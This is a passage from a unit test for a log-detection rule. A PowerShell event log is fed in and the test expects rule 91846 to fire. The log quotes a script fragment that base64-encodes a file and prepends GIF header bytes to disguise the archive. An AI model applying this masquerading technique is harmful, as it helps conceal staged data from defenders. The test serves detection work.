[System.Convert]::ToBase64String($fileContentBytes)\n\t$fileContentEncoded | set-content $zipfilename\n\t[Byte[]] $x = 0x47,0x49,0x46,0x38,0x39,0x61\n\t$save = get-content $zipfilename\n\t$x | set-content $zipfilename -Encoding Byte\n\tadd-content $zipfilename $save\n}\r\n\r\nScriptBlock ID: 279aee7f-0fa4-4cc6-8610-ce6112a598d3\r\nPath: \"","version":"1","systemTime":"2021-11-08T14:59:43.7761674Z","eventRecordID":"97407","threadID":"3972","computer":"hrmanager.ExchangeTest.com","task":"2","processID":"8120","severityValue":"VERBOSE","providerName":"Microsoft-Windows-PowerShell"}}}
'''
        response = send_log(log)

        self.assertEqual(response.status, LogtestStatus.RuleMatch)

        self.assertEqual(response.decoder, 'json')
        self.assertEqual(response.rule_id, '91846')
        self.assertEqual(response.rule_level, 10)

